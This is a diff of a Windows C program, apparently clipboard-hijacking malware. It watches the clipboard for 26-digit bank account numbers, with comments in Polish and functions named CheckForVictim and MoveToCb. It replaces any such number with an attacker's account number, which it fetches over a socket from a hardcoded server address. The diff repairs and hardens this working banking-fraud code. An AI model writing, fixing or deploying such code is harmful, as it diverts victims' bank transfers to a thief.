@@ -1,4 +1,6 @@
-﻿#define WIN32_LEAN_AND_MEAN
+﻿#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
 
 #include <Windows.h>
 #include <winsock2.h>
@@ -10,6 +12,7 @@
 
 #define MAXL			26
 #define DEFAULT_PORT	"27015"
+//#define DEFAULT_ADDR	"TheMonster.home"
 #define DEFAULT_ADDR	"192.168.0.10"
 #define DEAFULT_BUFLEN	512
 #define REQUEST_DELAY_S	10.0
@@ -42,6 +45,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	MSG msg;
 
+	bool connected = false;
+
 	while (GetMessage(&msg, NULL, 0, 0) > 0)
 	{
 		time(&current);
@@ -50,11 +55,17 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		{
 			// Wysłanie żądania do procesu nadawcy o konto bankowe
 			// Connect to server.
-			int iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-			if (iResult == SOCKET_ERROR) {
-				//freeaddrinfo(result);
-				closesocket(ConnectSocket);
-				ConnectSocket = INVALID_SOCKET;
+			if (!connected)
+			{
+				int iResult;
+				iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+				if (iResult == SOCKET_ERROR) {
+					freeaddrinfo(ptr);
+					closesocket(ConnectSocket);
+					WSACleanup();
+					return 1;
+				}
+				connected = true;
 			}
 			if (ConnectSocket != INVALID_SOCKET) {
 				GetAccountNumber();
@@ -65,6 +76,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		DispatchMessage(&msg);
 	}
 
+	closesocket(ConnectSocket);
 	WSACleanup();
 	return 0;
 }
@@ -127,9 +139,9 @@ bool init_winsock()
 
 	// Resolve the server address and port
 	// Remember to set address to the PC that server is on!!!
-	char ac[80];
+	/*char ac[80];
 	gethostname(ac, sizeof(ac));
-
+	iResult = getaddrinfo(ac, DEFAULT_PORT, &hints, &result);*/
 	iResult = getaddrinfo(DEFAULT_ADDR, DEFAULT_PORT, &hints, &result);
 	if (iResult != 0) {
 		WSACleanup();
@@ -148,6 +160,8 @@ bool init_winsock()
 		WSACleanup();
 		return false;
 	}
+
+	return true;
 }
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -199,7 +213,7 @@ void CheckForVictim()
 			lstrcpy(lpProgMem, lpCbMem);
 			GlobalUnlock(hCbMem);
 			// hProgMem - adres tymczasowej zmiennej w schowku
-			if (CheckIfAccountNumber((LPSTR)hProgMem))
+			if (CheckIfAccountNumber(lpProgMem))
 				MoveToCb();
 			GlobalUnlock(hProgMem);
 		}
@@ -230,12 +244,15 @@ void MoveToCb()
 bool CheckIfAccountNumber(LPSTR str)
 {
 	if (strlen(str) == MAXL)
+	{
 		for (int i = 0; i < MAXL; i++)
 		{
 			if (str[i] < '0' || str[i] > '9')
 				return false;
 		}
-	return true;
+		return true;
+	}
+	return false;
 }
 
 void GetAccountNumber()
@@ -248,27 +265,19 @@ void GetAccountNumber()
 	iResult = send(ConnectSocket, sockbuf, (int)strlen(sockbuf), 0);
 	if (iResult == SOCKET_ERROR) {
 		closesocket(ConnectSocket);
-		WSACleanup();
-		return;
-	}
-
-	// Shutdown the connection for sending since no more data will be sent
-	// The client can still use the ConnectSocket for receiving data
-	iResult = shutdown(ConnectSocket, SD_SEND);
-	if (iResult == SOCKET_ERROR) {
-		closesocket(ConnectSocket);
-		WSACleanup();
 		return;
 	}
 
 	// Receive data
-	iResult = recv(ConnectSocket, sockbuf, sockbuflen, 0);
-	if (iResult > 0)
-		//strcpy_s(bankAccount, sockbuf);
-		if (CheckIfAccountNumber(sockbuf))
-			memcpy_s(bankAccount, MAXL + 1, sockbuf, strlen(sockbuf));
-	else if (iResult < 0)
+	iResult = recv(ConnectSocket, sockbuf, sockbuflen, NULL);
+	if (iResult == SOCKET_ERROR)
+	{
+		closesocket(ConnectSocket);
 		return;
+	}
+	if (iResult > 0)
+	{
+		memcpy_s(bankAccount, MAXL + 1, sockbuf, strlen(sockbuf));
+	}
 	bAset = true;
-	closesocket(ConnectSocket);
 }
